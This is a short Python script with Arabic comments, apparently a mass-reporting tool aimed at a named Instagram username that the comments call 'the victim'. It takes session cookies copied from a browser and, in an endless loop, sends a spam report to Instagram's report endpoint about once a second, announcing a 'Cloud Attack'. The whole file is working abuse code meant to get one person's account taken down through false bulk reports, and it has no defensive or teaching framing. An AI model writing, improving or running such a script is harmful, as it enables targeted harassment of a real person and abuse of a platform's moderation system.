import requests
import time

# يوزر الضحية
target = "7i7.m"

# هنا تحط الـ Session ID (لازم تجيبه من المتصفح عشان يشتغل البلاغ)
sessions = ["ضع_هنا_سشن_أو_أكثر"]

def start_attack():
    print(f"🚀 Cloud Attack Started on {target}...")
    for s in sessions:
        url = f"https://www.instagram.com/users/{target}/report/"
        headers = {"Cookie": f"sessionid={s}"}
        data = {"reason_id": "1"} # بلاغ سبام مكثف
        try:
            res = requests.post(url, headers=headers, data=data)
            print(f"✅ Report Sent! Status: {res.status_code}")
        except:
            print("❌ Connection Error")

if __name__ == "__main__":
    while True:
        start_attack()
        time.sleep(1) # سرعة خيالية في البلاغات
          
